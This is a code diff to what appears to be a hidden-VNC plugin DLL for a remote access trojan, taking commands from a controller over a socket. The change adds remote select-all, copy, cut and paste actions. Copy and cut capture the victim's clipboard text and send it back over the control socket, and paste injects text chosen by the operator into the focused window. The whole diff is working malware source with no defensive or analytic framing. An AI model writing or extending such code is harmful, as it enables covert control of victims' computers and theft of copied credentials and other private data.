@@ -954,18 +954,40 @@ static void input_loop() {
         const json&   cmd    = task.cmd;
 
         // ---- Klavye ----
-        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
-            int vk = cmd.value("keycode", 0);
-            HWND hTarget = WindowFromPoint(g_lastMousePos);
-            if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
+        if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char" ||
+            action == "hvnc_selectall" || action == "hvnc_copy" || action == "hvnc_cut" || action == "hvnc_paste") {
+
+            HWND hTarget = GetFocusedWindow();
+            if (!hTarget || !IsWindow(hTarget)) hTarget = WindowFromPoint(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) continue;
 
             if (action == "hvnc_keydown") {
+                int vk = cmd.value("keycode", 0);
                 PostMessageW(hTarget, WM_KEYDOWN, (WPARAM)vk, key_lparam((WORD)vk, false));
             } else if (action == "hvnc_keyup") {
+                int vk = cmd.value("keycode", 0);
                 PostMessageW(hTarget, WM_KEYUP, (WPARAM)vk, key_lparam((WORD)vk, true));
             } else if (action == "hvnc_char") {
+                int vk = cmd.value("keycode", 0);
                 PostMessageW(hTarget, WM_CHAR, (WPARAM)vk, 1);
+            } else if (action == "hvnc_selectall") {
+                SendCtrlShortcut(hTarget, 'A');
+            } else if (action == "hvnc_copy" || action == "hvnc_cut") {
+                SendCtrlShortcut(hTarget, (action == "hvnc_copy" ? 'C' : 'X'));
+                thread([]() {
+                    Sleep(200);
+                    string text = GetClipboardText();
+                    if (!text.empty()) {
+                        json resp;
+                        resp["action"] = "hvnc_clipboard";
+                        resp["text"] = text;
+                        safe_send_json(g_socket, resp);
+                    }
+                }).detach();
+            } else if (action == "hvnc_paste") {
+                string text = cmd.value("text", "");
+                SetClipboardText(text);
+                SendCtrlShortcut(hTarget, 'V');
             }
             g_forceFullFrame = true;
             continue;
@@ -1188,6 +1210,53 @@ static string wstring_to_utf8(const wstring& wstr) {
     WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &res[0], size, NULL, NULL);
     if (!res.empty() && res.back() == '\0') res.pop_back();
     return res;
+}
+
+static string GetClipboardText() {
+    if (!OpenClipboard(NULL)) return "";
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData == NULL) {
+        CloseClipboard();
+        return "";
+    }
+    wchar_t* pText = static_cast<wchar_t*>(GlobalLock(hData));
+    if (pText == NULL) {
+        CloseClipboard();
+        return "";
+    }
+    wstring wstr(pText);
+    GlobalUnlock(hData);
+    CloseClipboard();
+    return wstring_to_utf8(wstr);
+}
+
+static void SetClipboardText(const string& text) {
+    if (!OpenClipboard(NULL)) return;
+    EmptyClipboard();
+    wstring wstr = utf8_to_wstring(text);
+    size_t size = (wstr.size() + 1) * sizeof(wchar_t);
+    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, size);
+    if (hMem) {
+        void* pMem = GlobalLock(hMem);
+        if (pMem) {
+            memcpy(pMem, wstr.c_str(), size);
+            GlobalUnlock(hMem);
+            if (!SetClipboardData(CF_UNICODETEXT, hMem)) {
+                GlobalFree(hMem);
+            }
+        } else {
+            GlobalFree(hMem);
+        }
+    }
+    CloseClipboard();
+}
+
+static void SendCtrlShortcut(HWND hwnd, WORD vk) {
+    if (!hwnd || !IsWindow(hwnd)) return;
+    SendMessageTimeoutW(hwnd, WM_KEYDOWN, VK_CONTROL, key_lparam(VK_CONTROL, false), SMTO_ABORTIFHUNG, 200, NULL);
+    SendMessageTimeoutW(hwnd, WM_KEYDOWN, vk, key_lparam(vk, false), SMTO_ABORTIFHUNG, 200, NULL);
+    SendMessageTimeoutW(hwnd, WM_KEYUP, vk, key_lparam(vk, true), SMTO_ABORTIFHUNG, 200, NULL);
+    SendMessageTimeoutW(hwnd, WM_KEYUP, VK_CONTROL, key_lparam(VK_CONTROL, true), SMTO_ABORTIFHUNG, 200, NULL);
 }
 
 static wstring get_app_path(const wstring& appName) {
@@ -1467,7 +1536,11 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
         } else if (action.find("hvnc_mouse") != string::npos ||
                    action.find("hvnc_key")   != string::npos ||
                    action == "hvnc_char" ||
-                   action == "hvnc_doubleclick") {
+                   action == "hvnc_doubleclick" ||
+                   action == "hvnc_selectall" ||
+                   action == "hvnc_copy" ||
+                   action == "hvnc_cut" ||
+                   action == "hvnc_paste") {
             lock_guard<mutex> lock(g_inputMutex);
             g_inputQueue.push({action, cmd});
             g_inputCV.notify_one();
